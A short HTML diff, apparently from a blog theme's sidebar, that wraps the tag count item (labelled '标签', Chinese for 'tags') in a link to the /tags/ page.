       <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
         <span class="site-state-item-count">7</span>
-        <span class="site-state-item-name">标签</span>
+        <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
 </div>
